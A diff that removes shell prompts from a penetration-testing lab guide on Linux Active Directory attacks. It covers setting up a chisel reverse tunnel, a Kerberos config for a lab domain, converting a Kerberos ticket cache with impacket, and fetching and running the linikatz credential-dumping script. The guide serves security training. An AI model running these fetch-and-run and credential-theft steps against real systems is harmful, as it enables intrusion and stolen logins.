@@ -738,10 +738,13 @@ We must download and execute [chisel](https://github.com/jpillora/chisel) on our
 ##### Download Chisel to our Attack Host
 
 ```shell
-fango@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
-fango@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
-fango@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
-fango@htb[/htb]$ sudo ./chisel server --reverse 
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+
+gzip -d chisel_1.7.7_linux_amd64.gz
+
+mv chisel_* chisel && chmod +x ./chisel
+
+sudo ./chisel server --reverse 
 
 2022/10/10 07:26:15 server: Reverse tunneling enabled
 2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
@@ -792,7 +795,7 @@ In case the package `krb5-user` is already installed, we need to change the conf
 ##### Kerberos Configuration File for INLANEFREIGHT.HTB
 
 ```shell
-fango@htb[/htb]$ cat /etc/krb5.conf
+cat /etc/krb5.conf
 
 [libdefaults]
         default_realm = INLANEFREIGHT.HTB
@@ -827,8 +830,9 @@ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 ##### Linikatz Download and Execution
 
 ```shell
-fango@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
-fango@htb[/htb]$ /opt/linikatz.sh
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+
+/opt/linikatz.sh
 ```
 
 ## Cracking Files
